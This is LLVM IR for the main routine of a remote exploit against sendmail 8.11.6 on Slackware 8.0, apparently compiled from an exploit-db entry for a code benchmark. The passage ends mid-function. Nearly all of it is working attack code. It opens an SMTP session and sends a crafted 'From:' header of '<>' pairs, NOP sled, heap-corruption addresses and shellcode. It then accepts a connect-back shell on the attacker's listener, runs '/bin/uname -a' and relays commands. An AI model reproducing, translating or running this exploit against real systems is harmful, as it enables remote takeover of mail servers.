; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22313.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22313.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i8*, i8* }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [64 x i8] c"copyright LAST STAGE OF DELIRIUM mar 2003 poland //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [40 x i8] c"sendmail 8.11.6 for Slackware 8.0 x86\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [89 x i8] c"usage: %s target [-l localaddr] [-b localport] [-p ptr] [-c count] [-t timeout] [-v 80]\0A\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"b:c:l:p:t:v:\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@MPTR = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i8* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [13 x i8] c"error: bind\0A\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"error: listen\0A\00", align 1
@PTR = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [16 x i8] c"error: address\0A\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"error: connect\0A\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"helo yahoo.com\0A\00", align 1
@.str.10 = private unnamed_addr constant [32 x i8] c"mail from: anonymous@yahoo.com\0A\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c"rcpt to: lp\0A\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"data\0A\00", align 1
@PNUM = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [2 x i8] c".\00", align 1
@stdout = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@OFF3 = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [10 x i8] c"From: %s\0A\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"Subject: hello\0A\00", align 1
@MAXLINE = common dso_local global i32 0, align 4
@OFF2 = common dso_local global i32 0, align 4
@.str.16 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c".\0A\00", align 1
@lookup = common dso_local global i32 0, align 4
@.str.18 = private unnamed_addr constant [15 x i8] c"error: accept\0A\00", align 1
@.str.19 = private unnamed_addr constant [30 x i8] c"\0Abase 0x%08x mcicache 0x%08x\0A\00", align 1
@.str.20 = private unnamed_addr constant [15 x i8] c"/bin/uname -a\0A\00", align 1
@errno = common dso_local global i64 0, align 8
@EWOULDBLOCK = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8
@.str.21 = private unnamed_addr constant [8 x i8] c"koniec\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca %struct.timeval, align 8
  %34 = alloca %struct.sockaddr_in, align 8
  %35 = alloca %struct.hostent*, align 8
  %36 = alloca [4096 x i8], align 16
  %37 = alloca [4096 x i8], align 16
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 80, i32* %28, align 4
  store i32 256, i32* %29, align 4
  store i32 1, i32* %30, align 4
  store i32 25, i32* %31, align 4
  store i8* null, i8** %40, align 8
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i64 0, i64 0))
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %45 = load i32, i32* %4, align 4
  %46 = icmp slt i32 %45, 3
  br i1 %46, label %47, label %53

47:                                               ; preds = %2
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.2, i64 0, i64 0), i8* %50)
  %52 = call i32 @exit(i32 -1) #3
  unreachable

53:                                               ; preds = %2
  br label %54

54:                                               ; preds = %80, %53
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %55, 1
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = call i32 @getopt(i32 %56, i8** %58, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  store i32 %59, i32* %21, align 4
  %60 = icmp ne i32 %59, -1
  br i1 %60, label %61, label %81

61:                                               ; preds = %54
  %62 = load i32, i32* %21, align 4
  switch i32 %62, label %80 [
    i32 98, label %63
    i32 99, label %66
    i32 108, label %69
    i32 116, label %71
    i32 118, label %74
    i32 112, label %77
  ]

63:                                               ; preds = %61
  %64 = load i8*, i8** @optarg, align 8
  %65 = call i32 @atoi(i8* %64)
  store i32 %65, i32* %31, align 4
  br label %80

66:                                               ; preds = %61
  %67 = load i8*, i8** @optarg, align 8
  %68 = call i32 @atoi(i8* %67)
  store i32 %68, i32* %29, align 4
  br label %80

69:                                               ; preds = %61
  %70 = load i8*, i8** @optarg, align 8
  store i8* %70, i8** %40, align 8
  br label %80

71:                                               ; preds = %61
  %72 = load i8*, i8** @optarg, align 8
  %73 = call i32 @atoi(i8* %72)
  store i32 %73, i32* %30, align 4
  br label %80

74:                                               ; preds = %61
  %75 = load i8*, i8** @optarg, align 8
  %76 = call i32 @atoi(i8* %75)
  store i32 %76, i32* %28, align 4
  br label %80

77:                                               ; preds = %61
  %78 = load i8*, i8** @optarg, align 8
  %79 = call i32 @sscanf(i8* %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32* @MPTR)
  br label %80

80:                                               ; preds = %77, %61, %74, %71, %69, %66, %63
  br label %54

81:                                               ; preds = %54
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 1
  %84 = load i8*, i8** %83, align 8
  store i8* %84, i8** %39, align 8
  %85 = load i8*, i8** @AF_INET, align 8
  %86 = load i32, i32* @SOCK_STREAM, align 4
  %87 = call i32 @socket(i8* %85, i32 %86, i32 0)
  store i32 %87, i32* %7, align 4
  %88 = call i32 @bzero(%struct.sockaddr_in* %34, i32 24)
  %89 = load i8*, i8** @AF_INET, align 8
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %34, i32 0, i32 2
  store i8* %89, i8** %90, align 8
  %91 = load i32, i32* %31, align 4
  %92 = call i8* @htons(i32 %91)
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %34, i32 0, i32 1
  store i8* %92, i8** %93, align 8
  %94 = load i32, i32* %7, align 4
  %95 = bitcast %struct.sockaddr_in* %34 to %struct.sockaddr*
  %96 = call i32 @bind(i32 %94, %struct.sockaddr* %95, i32 24)
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %101

98:                                               ; preds = %81
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  %100 = call i32 @exit(i32 -1) #3
  unreachable

101:                                              ; preds = %81
  %102 = load i32, i32* %7, align 4
  %103 = call i32 @listen(i32 %102, i32 10)
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %108

105:                                              ; preds = %101
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0))
  %107 = call i32 @exit(i32 -1) #3
  unreachable

108:                                              ; preds = %101
  %109 = load i8*, i8** %40, align 8
  %110 = load i32, i32* %31, align 4
  %111 = call i32 @initasmcode(i8* %109, i32 %110)
  store i32 0, i32* %26, align 4
  br label %112

112:                                              ; preds = %488, %108
  %113 = load i32, i32* %26, align 4
  %114 = load i32, i32* %29, align 4
  %115 = icmp slt i32 %113, %114
  br i1 %115, label %116, label %495

116:                                              ; preds = %112
  %117 = load i32, i32* @MPTR, align 4
  store i32 %117, i32* @PTR, align 4
  %118 = load i8*, i8** @AF_INET, align 8
  %119 = load i32, i32* @SOCK_STREAM, align 4
  %120 = call i32 @socket(i8* %118, i32 %119, i32 0)
  store i32 %120, i32* %6, align 4
  %121 = call i32 @bzero(%struct.sockaddr_in* %34, i32 24)
  %122 = load i8*, i8** @AF_INET, align 8
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %34, i32 0, i32 2
  store i8* %122, i8** %123, align 8
  %124 = call i8* @htons(i32 25)
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %34, i32 0, i32 1
  store i8* %124, i8** %125, align 8
  %126 = load i8*, i8** %39, align 8
  %127 = call i32 @inet_addr(i8* %126)
  %128 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %34, i32 0, i32 0
  %129 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %128, i32 0, i32 0
  store i32 %127, i32* %129, align 8
  %130 = icmp eq i32 %127, -1
  br i1 %130, label %131, label %145

131:                                              ; preds = %116
  %132 = load i8*, i8** %39, align 8
  %133 = call %struct.hostent* @gethostbyname(i8* %132)
  store %struct.hostent* %133, %struct.hostent** %35, align 8
  %134 = icmp eq %struct.hostent* %133, null
  br i1 %134, label %135, label %138

135:                                              ; preds = %131
  %136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0))
  %137 = call i32 @exit(i32 -1) #3
  unreachable

138:                                              ; preds = %131
  %139 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %34, i32 0, i32 0
  %140 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %139, i32 0, i32 0
  %141 = load %struct.hostent*, %struct.hostent** %35, align 8
  %142 = getelementptr inbounds %struct.hostent, %struct.hostent* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 4
  %144 = call i32 @memcpy(i32* %140, i32 %143, i32 4)
  br label %145

145:                                              ; preds = %138, %116
  %146 = load i32, i32* %6, align 4
  %147 = bitcast %struct.sockaddr_in* %34 to %struct.sockaddr*
  %148 = call i32 @connect(i32 %146, %struct.sockaddr* %147, i32 24)
  %149 = icmp eq i32 %148, -1
  br i1 %149, label %150, label %153

150:                                              ; preds = %145
  %151 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0))
  %152 = call i32 @exit(i32 -1) #3
  unreachable

153:                                              ; preds = %145
  %154 = call i32 (...) @initlookup()
  %155 = load i32, i32* %6, align 4
  %156 = call i32 @sendcommand(i32 %155, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0), i32 0)
  %157 = load i32, i32* %6, align 4
  %158 = call i32 @sendcommand(i32 %157, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0), i32 0)
  %159 = load i32, i32* %6, align 4
  %160 = call i32 @sendcommand(i32 %159, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0), i32 0)
  %161 = load i32, i32* %6, align 4
  %162 = call i32 @sendcommand(i32 %161, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), i32 0)
  %163 = load i32, i32* @PTR, align 4
  %164 = load i32, i32* @PNUM, align 4
  %165 = mul nsw i32 %164, 4
  %166 = call i32 @findblock(i32 %163, i32 %165, i32 1)
  store i32 %166, i32* %12, align 4
  %167 = load i32, i32* %12, align 4
  %168 = load i32, i32* @PNUM, align 4
  %169 = mul nsw i32 %168, 4
  %170 = call i32 @ALLOCBLOCK(i32 %167, i32 %169)
  %171 = load i32, i32* %12, align 4
  %172 = call i32 @IDX2PTR(i32 %171)
  store i32 %172, i32* %15, align 4
  %173 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %174 = load i32, i32* @stdout, align 4
  %175 = call i32 @fflush(i32 %174)
  %176 = load i32, i32* @PTR, align 4
  %177 = load i32*, i32** @shellcode, align 8
  %178 = call i32 @strlen(i32* %177)
  %179 = load i32, i32* @PNUM, align 4
  %180 = mul nsw i32 %179, 4
  %181 = add nsw i32 %178, %180
  %182 = call i32 @findblock(i32 %176, i32 %181, i32 1)
  store i32 %182, i32* %11, align 4
  %183 = load i32, i32* %11, align 4
  %184 = load i32*, i32** @shellcode, align 8
  %185 = call i32 @strlen(i32* %184)
  %186 = load i32, i32* @PNUM, align 4
  %187 = mul nsw i32 %186, 4
  %188 = add nsw i32 %185, %187
  %189 = call i32 @ALLOCBLOCK(i32 %183, i32 %188)
  %190 = load i32, i32* %28, align 4
  switch i32 %190, label %192 [
    i32 80, label %191
  ]

191:                                              ; preds = %153
  store i32 28, i32* %22, align 4
  store i32 70, i32* %23, align 4
  store i32 148, i32* %24, align 4
  store i32 28, i32* %25, align 4
  br label %194

192:                                              ; preds = %153
  %193 = call i32 @exit(i32 -1) #3
  unreachable

194:                                              ; preds = %191
  %195 = load i32, i32* %24, align 4
  %196 = sub nsw i32 %195, 8
  store i32 %196, i32* %24, align 4
  %197 = getelementptr inbounds [4096 x i8], [4096 x i8]* %36, i64 0, i64 0
  store i8* %197, i8** %38, align 8
  store i32 0, i32* %8, align 4
  br label %198

198:                                              ; preds = %206, %194
  %199 = load i32, i32* %8, align 4
  %200 = icmp slt i32 %199, 138
  br i1 %200, label %201, label %209

201:                                              ; preds = %198
  %202 = load i8*, i8** %38, align 8
  %203 = getelementptr inbounds i8, i8* %202, i32 1
  store i8* %203, i8** %38, align 8
  store i8 60, i8* %202, align 1
  %204 = load i8*, i8** %38, align 8
  %205 = getelementptr inbounds i8, i8* %204, i32 1
  store i8* %205, i8** %38, align 8
  store i8 62, i8* %204, align 1
  br label %206

206:                                              ; preds = %201
  %207 = load i32, i32* %8, align 4
  %208 = add nsw i32 %207, 1
  store i32 %208, i32* %8, align 4
  br label %198

209:                                              ; preds = %198
  %210 = load i8*, i8** %38, align 8
  %211 = getelementptr inbounds i8, i8* %210, i32 1
  store i8* %211, i8** %38, align 8
  store i8 40, i8* %210, align 1
  store i32 0, i32* %8, align 4
  br label %212

212:                                              ; preds = %221, %209
  %213 = load i32, i32* %8, align 4
  %214 = load i32, i32* %22, align 4
  %215 = icmp slt i32 %213, %214
  br i1 %215, label %216, label %224

216:                                              ; preds = %212
  %217 = load i32, i32* @NOP, align 4
  %218 = trunc i32 %217 to i8
  %219 = load i8*, i8** %38, align 8
  %220 = getelementptr inbounds i8, i8* %219, i32 1
  store i8* %220, i8** %38, align 8
  store i8 %218, i8* %219, align 1
  br label %221

221:                                              ; preds = %216
  %222 = load i32, i32* %8, align 4
  %223 = add nsw i32 %222, 1
  store i32 %223, i32* %8, align 4
  br label %212

224:                                              ; preds = %212
  %225 = load i8*, i8** %38, align 8
  %226 = getelementptr inbounds i8, i8* %225, i32 1
  store i8* %226, i8** %38, align 8
  store i8 41, i8* %225, align 1
  %227 = load i8*, i8** %38, align 8
  %228 = getelementptr inbounds i8, i8* %227, i32 1
  store i8* %228, i8** %38, align 8
  store i8 0, i8* %227, align 1
  %229 = load i32, i32* @OFF3, align 4
  %230 = load i32, i32* %22, align 4
  %231 = add nsw i32 %229, %230
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [4096 x i8], [4096 x i8]* %36, i64 0, i64 %232
  %234 = load i32, i32* %15, align 4
  %235 = call i32 @putaddr(i8* %233, i32 %234)
  %236 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 0
  %237 = getelementptr inbounds [4096 x i8], [4096 x i8]* %36, i64 0, i64 0
  %238 = call i32 @sprintf(i8* %236, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i8* %237)
  %239 = load i32, i32* %6, align 4
  %240 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 0
  %241 = call i32 @sendcommand(i32 %239, i8* %240, i32 0)
  %242 = load i32, i32* %6, align 4
  %243 = call i32 @sendcommand(i32 %242, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0), i32 0)
  %244 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 0
  %245 = load i32, i32* @NOP, align 4
  %246 = load i32, i32* @MAXLINE, align 4
  %247 = call i32 @memset(i8* %244, i32 %245, i32 %246)
  %248 = load i32, i32* @MAXLINE, align 4
  %249 = sub nsw i32 %248, 2
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %250
  store i8 10, i8* %251, align 1
  %252 = load i32, i32* @MAXLINE, align 4
  %253 = sub nsw i32 %252, 1
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %254
  store i8 0, i8* %255, align 1
  store i32 0, i32* %10, align 4
  br label %256

256:                                              ; preds = %291, %224
  %257 = load i32, i32* %10, align 4
  %258 = load i32, i32* @PNUM, align 4
  %259 = icmp slt i32 %257, %258
  br i1 %259, label %260, label %357

260:                                              ; preds = %256
  %261 = load i32, i32* %15, align 4
  store i32 %261, i32* %16, align 4
  %262 = load i32, i32* @OFF2, align 4
  %263 = call i32 @IDX2PTR(i32 %262)
  store i32 %263, i32* %17, align 4
  %264 = load i32, i32* %16, align 4
  %265 = call i32 @findsblock(i32 %264)
  store i32 %265, i32* %13, align 4
  %266 = icmp ne i32 %265, 0
  br i1 %266, label %268, label %267

267:                                              ; preds = %260
  br label %357

268:                                              ; preds = %260
  %269 = load i32, i32* %13, align 4
  %270 = call i32 @IDX2PTR(i32 %269)
  store i32 %270, i32* %16, align 4
  %271 = load i32, i32* %17, align 4
  %272 = load i32, i32* %23, align 4
  %273 = load i32, i32* %24, align 4
  %274 = load i32, i32* %25, align 4
  %275 = call i32 @findfblock(i32 %271, i32 %272, i32 %273, i32 %274)
  store i32 %275, i32* %14, align 4
  %276 = icmp ne i32 %275, 0
  br i1 %276, label %278, label %277

277:                                              ; preds = %268
  br label %357

278:                                              ; preds = %268
  %279 = load i32, i32* %14, align 4
  %280 = call i32 @IDX2PTR(i32 %279)
  store i32 %280, i32* %17, align 4
  %281 = load i32, i32* %11, align 4
  %282 = call i32 @IDX2PTR(i32 %281)
  store i32 %282, i32* %20, align 4
  br label %283

283:                                              ; preds = %288, %278
  %284 = load i32, i32* %20, align 4
  %285 = call i32 @validaddr(i32 %284)
  %286 = icmp ne i32 %285, 0
  %287 = xor i1 %286, true
  br i1 %287, label %288, label %291

288:                                              ; preds = %283
  %289 = load i32, i32* %20, align 4
  %290 = add nsw i32 %289, 4
  store i32 %290, i32* %20, align 4
  br label %283

291:                                              ; preds = %283
  %292 = load i32, i32* %12, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %293
  %295 = load i32, i32* %16, align 4
  %296 = call i32 @putaddr(i8* %294, i32 %295)
  %297 = load i32, i32* %13, align 4
  %298 = add nsw i32 %297, 36
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %299
  %301 = load i32, i32* %15, align 4
  %302 = call i32 @putaddr(i8* %300, i32 %301)
  %303 = load i32, i32* %13, align 4
  %304 = add nsw i32 %303, 40
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %305
  %307 = load i32, i32* %15, align 4
  %308 = call i32 @putaddr(i8* %306, i32 %307)
  %309 = load i32, i32* %13, align 4
  %310 = add nsw i32 %309, 24
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %311
  %313 = load i32, i32* %17, align 4
  %314 = load i32, i32* %24, align 4
  %315 = sub nsw i32 %313, %314
  %316 = load i32, i32* %25, align 4
  %317 = sub nsw i32 %315, %316
  %318 = call i32 @putaddr(i8* %312, i32 %317)
  %319 = load i32, i32* %14, align 4
  %320 = load i32, i32* %24, align 4
  %321 = sub nsw i32 %319, %320
  %322 = load i32, i32* %25, align 4
  %323 = sub nsw i32 %321, %322
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %324
  %326 = call i32 @putaddr(i8* %325, i32 16843009)
  %327 = load i32, i32* %14, align 4
  %328 = load i32, i32* %24, align 4
  %329 = sub nsw i32 %327, %328
  %330 = load i32, i32* %25, align 4
  %331 = sub nsw i32 %329, %330
  %332 = load i32, i32* %23, align 4
  %333 = add nsw i32 %331, %332
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %334
  %336 = call i32 @putaddr(i8* %335, i32 -8)
  %337 = load i32, i32* %14, align 4
  %338 = load i32, i32* %25, align 4
  %339 = sub nsw i32 %337, %338
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %340
  %342 = load i32, i32* %17, align 4
  %343 = load i32, i32* %25, align 4
  %344 = sub nsw i32 %342, %343
  %345 = call i32 @putaddr(i8* %341, i32 %344)
  %346 = load i32, i32* %14, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %347
  %349 = load i32, i32* %20, align 4
  %350 = call i32 @putaddr(i8* %348, i32 %349)
  %351 = load i32, i32* %12, align 4
  %352 = add nsw i32 %351, 4
  store i32 %352, i32* %12, align 4
  %353 = load i32, i32* @PTR, align 4
  %354 = sub nsw i32 %353, 4
  store i32 %354, i32* @PTR, align 4
  %355 = load i32, i32* %10, align 4
  %356 = add nsw i32 %355, 1
  store i32 %356, i32* %10, align 4
  br label %256

357:                                              ; preds = %277, %267, %256
  %358 = load i32, i32* %11, align 4
  %359 = load i32, i32* @PNUM, align 4
  %360 = mul nsw i32 4, %359
  %361 = add nsw i32 %358, %360
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 %362
  store i8* %363, i8** %38, align 8
  store i32 0, i32* %8, align 4
  br label %364

364:                                              ; preds = %378, %357
  %365 = load i32, i32* %8, align 4
  %366 = load i32*, i32** @shellcode, align 8
  %367 = call i32 @strlen(i32* %366)
  %368 = icmp slt i32 %365, %367
  br i1 %368, label %369, label %381

369:                                              ; preds = %364
  %370 = load i32*, i32** @shellcode, align 8
  %371 = load i32, i32* %8, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds i32, i32* %370, i64 %372
  %374 = load i32, i32* %373, align 4
  %375 = trunc i32 %374 to i8
  %376 = load i8*, i8** %38, align 8
  %377 = getelementptr inbounds i8, i8* %376, i32 1
  store i8* %377, i8** %38, align 8
  store i8 %375, i8* %376, align 1
  br label %378

378:                                              ; preds = %369
  %379 = load i32, i32* %8, align 4
  %380 = add nsw i32 %379, 1
  store i32 %380, i32* %8, align 4
  br label %364

381:                                              ; preds = %364
  %382 = load i32, i32* %6, align 4
  %383 = getelementptr inbounds [4096 x i8], [4096 x i8]* %37, i64 0, i64 0
  %384 = call i32 @sendcommand(i32 %382, i8* %383, i32 0)
  %385 = load i32, i32* %6, align 4
  %386 = call i32 @sendcommand(i32 %385, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0), i32 0)
  %387 = load i32, i32* %6, align 4
  %388 = call i32 @sendcommand(i32 %387, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i32 0)
  %389 = load i32, i32* @lookup, align 4
  %390 = call i32 @free(i32 %389)
  %391 = call i32 @FD_ZERO(i32* %32)
  %392 = call i32 @FD_SET(i32 0, i32* %32)
  %393 = load i32, i32* %7, align 4
  %394 = call i32 @FD_SET(i32 %393, i32* %32)
  %395 = load i32, i32* %30, align 4
  %396 = getelementptr inbounds %struct.timeval, %struct.timeval* %33, i32 0, i32 0
  store i32 %395, i32* %396, align 8
  %397 = getelementptr inbounds %struct.timeval, %struct.timeval* %33, i32 0, i32 1
  store i64 0, i64* %397, align 8
  %398 = load i32, i32* %7, align 4
  %399 = add nsw i32 %398, 1
  %400 = call i64 @select(i32 %399, i32* %32, i32* null, i32* null, %struct.timeval* %33)
  %401 = icmp sgt i64 %400, 0
  br i1 %401, label %402, label %420

402:                                              ; preds = %381
  %403 = load i32, i32* %6, align 4
  %404 = call i32 @close(i32 %403)
  store i32 1, i32* %27, align 4
  %405 = load i32, i32* %7, align 4
  %406 = bitcast %struct.sockaddr_in* %34 to %struct.sockaddr*
  %407 = call i32 @accept(i32 %405, %struct.sockaddr* %406, i32* %22)
  store i32 %407, i32* %6, align 4
  %408 = icmp eq i32 %407, -1
  br i1 %408, label %409, label %412

409:                                              ; preds = %402
  %410 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.18, i64 0, i64 0))
  %411 = call i32 @exit(i32 -1) #3
  unreachable

412:                                              ; preds = %402
  %413 = load i32, i32* %7, align 4
  %414 = call i32 @close(i32 %413)
  %415 = load i32, i32* @PTR, align 4
  %416 = load i32, i32* %15, align 4
  %417 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.19, i64 0, i64 0), i32 %415, i32 %416)
  %418 = load i32, i32* %6, align 4
  %419 = call i32 @write(i32 %418, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.20, i64 0, i64 0), i32 14)
  br label %423

420:                                              ; preds = %381
  %421 = load i32, i32* %6, align 4
  %422 = call i32 @close(i32 %421)
  store i32 0, i32* %27, align 4
  br label %423

423:                                              ; preds = %420, %412
  br label %424

424:                                              ; preds = %486, %477, %451, %423
  %425 = load i32, i32* %27, align 4
  %426 = icmp ne i32 %425, 0
  br i1 %426, label %427, label %487

427:                                              ; preds = %424
  %428 = call i32 @FD_ZERO(i32* %32)
  %429 = call i32 @FD_SET(i32 0, i32* %32)
  %430 = load i32, i32* %6, align 4
  %431 = call i32 @FD_SET(i32 %430, i32* %32)
  %432 = load i32, i32* %6, align 4
  %433 = add nsw i32 %432, 1
  %434 = call i64 @select(i32 %433, i32* %32, i32* null, i32* null, %struct.timeval* null)
  %435 = icmp ne i64 %434, 0
  br i1 %435, label %436, label %486

436:                                              ; preds = %427
  %437 = call i64 @FD_ISSET(i32 0, i32* %32)
  %438 = icmp ne i64 %437, 0
  br i1 %438, label %439, label %460

439:                                              ; preds = %436
  %440 = getelementptr inbounds [1024 x i8], [1024 x i8]* %42, i64 0, i64 0
  %441 = call i32 @read(i32 0, i8* %440, i32 1024)
  store i32 %441, i32* %41, align 4
  %442 = icmp slt i32 %441, 1
  br i1 %442, label %443, label %455

443:                                              ; preds = %439
  %444 = load i64, i64* @errno, align 8
  %445 = load i64, i64* @EWOULDBLOCK, align 8
  %446 = icmp eq i64 %444, %445
  br i1 %446, label %451, label %447

447:                                              ; preds = %443
  %448 = load i64, i64* @errno, align 8
  %449 = load i64, i64* @EAGAIN, align 8
  %450 = icmp eq i64 %448, %449
  br i1 %450, label %451, label %452

451:                                              ; preds = %447, %443
  br label %424

452:                                              ; preds = %447
  %453 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.21, i64 0, i64 0))
  %454 = call i32 @exit(i32 -1) #3
  unreachable

455:                                              ; preds = %439
  %456 = load i32, i32* %6, align 4
  %457 = getelementptr inbounds [1024 x i8], [1024 x i8]* %42, i64 0, i64 0
  %458 = load i32, i32* %41, align 4
  %459 = call i32 @write(i32 %456, i8* %457, i32 %458)
  br label %460

460:                                              ; preds = %455, %436
  %461 = load i32, i32* %6, align 4
  %462 = call i64 @FD_ISSET(i32 %461, i32* %32)
  %463 = icmp ne i64 %462, 0
  br i1 %463, label %464, label %485

464:                                              ; preds = %460
  %465 = load i32, i32* %6, align 4
  %466 = getelementptr inbounds [1024 x i8], [1024 x i8]* %42, i64 0, i64 0
  %467 = call i32 @read(i32 %465, i8* %466, i32 1024)
